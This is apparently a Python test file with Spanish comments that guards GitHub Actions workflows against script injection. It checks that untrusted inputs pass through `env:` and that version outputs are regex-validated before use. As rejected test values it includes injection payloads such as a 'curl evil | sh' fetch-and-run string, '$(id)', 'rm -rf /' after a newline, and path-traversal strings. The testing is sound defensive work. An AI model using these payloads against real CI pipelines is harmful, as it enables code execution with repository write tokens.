"""Los workflows de GitHub Actions corren con `contents: write` y con el GITHUB_TOKEN: lo que llegue a un `run:` se
ejecuta con esos permisos. GitHub expande `${{ … }}` ANTES de que el shell vea el script, pegándolo como texto: un
valor como  7.2"; curl evil | sh; "  en un input de workflow_dispatch se convierte en comandos.

Estas pruebas fijan la regla: nada que controle un usuario (inputs, nombre de rama, contenido de eventos) se interpola
en un `run:`; entra por `env:` y se valida. Y que los valores que SÍ se interpolan desde `needs.*.outputs` (la versión del
kernel y la de la ISO) nacen de un paso que los valida con una expresión regular — que además se prueba con bash real.
"""
import os
import re
import shutil
import subprocess
import unittest
from pathlib import Path

try:
    import yaml
except ImportError:      # CI lo instala (python3-yaml); sin él estas pruebas se saltan, como las de test_workflows.py
    yaml = None

ROOT = Path(__file__).resolve().parent.parent
WORKFLOWS = sorted((ROOT / ".github" / "workflows").glob("*.yml"))
EXPR = re.compile(r"\$\{\{\s*(.*?)\s*\}\}", re.S)

# contextos que un atacante con acceso de lectura/escritura al repo puede fijar a un valor arbitrario
UNTRUSTED = re.compile(r"github\.event\.(?!event_name)|\binputs\.|github\.head_ref|github\.ref_name|github\.actor|github\.triggering_actor|github\.base_ref|github\.ref\b")
# lo que sí está bien pegar en un script: constantes de GitHub/del workflow y outputs que se validan (ver abajo)
SAFE = re.compile(r"^(env\.[A-Za-z_]+|github\.(event_name|workspace|repository|run_id|run_number|sha|server_url|repository_owner)|"
                  r"secrets\.GITHUB_TOKEN|matrix\.[A-Za-z_.]+|runner\.[a-z_]+|needs\.[\w-]+\.outputs\.[\w]+|needs\.[\w-]+\.result|steps\.[\w-]+\.outputs\.[\w]+|steps\.[\w-]+\.outcome)$")


def steps(wf):
    doc = yaml.safe_load(wf.read_text(encoding="utf-8"))
    for job_id, job in (doc.get("jobs") or {}).items():
        for i, st in enumerate(job.get("steps") or []):
            yield job_id, i, st


@unittest.skipIf(yaml is None, "PyYAML no está instalado")
class NoUntrustedContextInRunScripts(unittest.TestCase):
    def test_run_scripts_only_interpolate_safe_expressions(self):
        offenders = []
        for wf in WORKFLOWS:
            for job_id, i, st in steps(wf):
                for expr in EXPR.findall(st.get("run", "") or ""):
                    if UNTRUSTED.search(expr) or not SAFE.match(expr):
                        offenders.append(f"{wf.name} · {job_id} · paso {i} ({st.get('name', '?')}): ${{{{ {expr} }}}}")
        self.assertEqual(offenders, [], "expresiones que no deben ir dentro de `run:` (pásalas por env: y valídalas)")

    def test_the_inputs_that_exist_reach_the_scripts_through_env(self):
        for wf in WORKFLOWS:
            text = wf.read_text(encoding="utf-8")
            for name in re.findall(r"github\.event\.inputs\.(\w+)", text):
                with self.subTest(wf=wf.name, input=name):
                    uses = [m for m in re.finditer(r"^\s*([A-Z_]+):\s*\$\{\{\s*github\.event\.inputs\." + name + r"\s*\}\}", text, re.M)]
                    conditions = re.findall(r"^\s*if:.*github\.event\.inputs\." + name, text, re.M)
                    self.assertTrue(uses or conditions, f"{wf.name}: el input {name} se usa en un sitio que no es env: ni if:")


@unittest.skipIf(yaml is None, "PyYAML no está instalado")
class VersionOutputsAreValidated(unittest.TestCase):
    def producing_run(self, wf_name, output_line_prefix):
        wf = ROOT / ".github" / "workflows" / wf_name
        for _job, _i, st in steps(wf):
            run = st.get("run") or ""
            if output_line_prefix in run:
                return run
        self.fail(f"{wf_name}: no encontré el paso que escribe {output_line_prefix}")

    def regex_in(self, run, var):
        m = re.search(r'if ! \( LC_ALL=C; \[\[ "\$' + var + r'" =~ (.+?) \]\] \); then', run)
        self.assertTrue(m, f"el paso que escribe {var} no lo valida con [[ =~ ]] (dentro de un subshell con LC_ALL=C) antes de publicarlo")
        self.assertLess(m.start(), run.index('>> "$GITHUB_OUTPUT"'), "la validación tiene que ir ANTES de escribir el output")
        return m.group(1)

    @staticmethod
    def utf8_locales():
        """Locales UTF-8 distintos de C que existan aquí: en ellos los rangos de [[ =~ ]] siguen la colación y aceptan
        «ñ» o «７» (reproducido con en_US.UTF-8). En un equipo sin ninguno la prueba no puede ejercitar ese riesgo."""
        out = subprocess.run(["locale", "-a"], capture_output=True, text=True).stdout.split() if shutil.which("locale") else []
        return [l for l in out if "utf" in l.lower() and not l.lower().startswith(("c.", "posix"))]

    def bash_accepts(self, pattern, value, locale=None):
        """El MISMO envoltorio que el workflow (subshell con LC_ALL=C), bajo el locale pedido."""
        env = {**os.environ, "LC_ALL": locale} if locale else {k: v for k, v in os.environ.items() if k not in ("LC_ALL",)}
        r = subprocess.run(["bash", "-c", f'( LC_ALL=C; [[ "$1" =~ {pattern} ]] )', "bash", value], capture_output=True, timeout=10, env=env)
        return r.returncode == 0

    def test_the_validation_does_not_depend_on_the_runner_locale(self):
        """Falló en un Arch con locale UTF-8: «ñ» y «７.２» pasaban el regex. Con LC_ALL=C dentro del subshell, no."""
        kernel = self.regex_in(self.producing_run("build-kernel.yml", 'echo "kernel_ver='), "KERNEL_VER")
        iso = self.regex_in(self.producing_run("build-iso.yml", 'echo "version='), "VERSION")
        for loc in [None, *self.utf8_locales()]:
            with self.subTest(locale=loc):
                self.assertFalse(self.bash_accepts(kernel, "７.２", loc))
                self.assertFalse(self.bash_accepts(kernel, "٩.٩", loc))
                self.assertFalse(self.bash_accepts(iso, "ñ", loc))
                self.assertFalse(self.bash_accepts(iso, "é1", loc))
                self.assertTrue(self.bash_accepts(kernel, "7.2.14", loc))
                self.assertTrue(self.bash_accepts(iso, "2026.11.14", loc))

    def test_the_kernel_version_is_validated_before_it_becomes_an_output(self):
        pattern = self.regex_in(self.producing_run("build-kernel.yml", 'echo "kernel_ver='), "KERNEL_VER")
        for good in ("7.2", "7.2.14", "6.12.1", "7.3-rc1", "7.3.rc1", "10.0.1"):
            with self.subTest(good=good):
                self.assertTrue(self.bash_accepts(pattern, good))
        for bad in ('7.2"; curl evil|sh; "', "$(id)", "`id`", "7.2.14 ", " 7.2", "", "7", "7.2.14.1", "7.2\nrm -rf /", "7.2;id", "7.2-rc", "-7.2",
                    "7.2.14\n", "../7.2", "7.2/../../x", "7.2.14.arch1", "7.2 8.1", "７.２"):
            with self.subTest(bad=bad):
                self.assertFalse(self.bash_accepts(pattern, bad))

    def test_the_iso_version_is_validated_before_it_becomes_an_output(self):
        pattern = self.regex_in(self.producing_run("build-iso.yml", 'echo "version='), "VERSION")
        for good in ("2026.11.14", "1.0.0+build.5", "v1.2", "2026.11.14-rc1", "0", "A"):
            with self.subTest(good=good):
                self.assertTrue(self.bash_accepts(pattern, good))
        for bad in ('1"; id; "', "$(id)", "a b", "x;id", "", ".oculto", "-opcion", "1\n2", "a" * 80, "../x", "a/b", "a\\b", "ñ", "1.0 "):
            with self.subTest(bad=bad):
                self.assertFalse(self.bash_accepts(pattern, bad))

    def test_the_kernel_version_input_is_the_only_hand_typed_value_and_it_goes_through_env(self):
        text = (ROOT / ".github/workflows/build-kernel.yml").read_text(encoding="utf-8")
        self.assertIn("INPUT_KERNEL_VERSION: ${{ github.event.inputs.kernel_version }}", text)
        self.assertIn('KERNEL_VER="$INPUT_KERNEL_VERSION"', text)


if __name__ == "__main__":
    unittest.main()
